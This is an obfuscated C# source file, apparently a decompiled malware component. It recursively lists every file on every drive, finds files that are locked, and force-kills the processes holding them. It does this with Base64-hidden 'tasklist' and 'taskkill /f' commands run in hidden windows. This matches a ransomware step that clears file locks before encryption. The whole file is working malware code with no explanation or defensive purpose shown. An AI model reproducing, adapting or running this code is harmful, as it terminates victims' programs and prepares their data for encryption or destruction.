using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace VsYjhNTIRPBh;

internal class IlfCoNWMBTzl
{
	[CompilerGenerated]
	private sealed class RByQUmYYQEfWut
	{
		public string PJwgfAknzwTZF;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(PJwgfAknzwTZF);
		}
	}

	public static readonly List<string> mnkTTsvFTUWLbK = new List<string>();

	public static readonly List<string> ORlxcCRJkYp = new List<string>();

	public static void wsYFGotQkdix()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					dtrusQxLXnGb(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void dtrusQxLXnGb(string wuiwKAiXeW)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(wuiwKAiXeW);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					mnkTTsvFTUWLbK.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					dtrusQxLXnGb(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (mnkTTsvFTUWLbK.Count <= 0)
		{
			return;
		}
		foreach (string item in mnkTTsvFTUWLbK.Where((string EQKfwHeYCuMtUCFy) => BxdCSMELkuma(EQKfwHeYCuMtUCFy)))
		{
			ORlxcCRJkYp.Add(item);
		}
		mnkTTsvFTUWLbK.Clear();
		if (ORlxcCRJkYp.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in ORlxcCRJkYp.Select((string AyGhvfvrFBDN) => new FileInfo(AyGhvfvrFBDN)))
		{
			SxXuDtbxCNga(item2.Name);
		}
	}

	public static bool BxdCSMELkuma(string FTSVjUmNNNPI)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(FTSVjUmNNNPI, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(FTSVjUmNNNPI, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void SxXuDtbxCNga(string WsLcAaEPmxFuPzKZ)
	{
		try
		{
			string text = oVKkJMmHAtfqIySC(BdNzYJbFQkt.bRWwIGxQDNUf("dGFza2xpc3Q="), BdNzYJbFQkt.bRWwIGxQDNUf("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(WsLcAaEPmxFuPzKZ)
				select t into IwrjQfKtnrC
				select IwrjQfKtnrC.Split(new char[1] { ',' }) into LqoUUeQshPashS
				select LqoUUeQshPashS[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				oVKkJMmHAtfqIySC(BdNzYJbFQkt.bRWwIGxQDNUf("dGFza2tpbGw="), BdNzYJbFQkt.bRWwIGxQDNUf("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string oVKkJMmHAtfqIySC(string jeUZsGxxcMHEY, string GBKRNWiDIaWsRjlP)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(jeUZsGxxcMHEY, GBKRNWiDIaWsRjlP);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
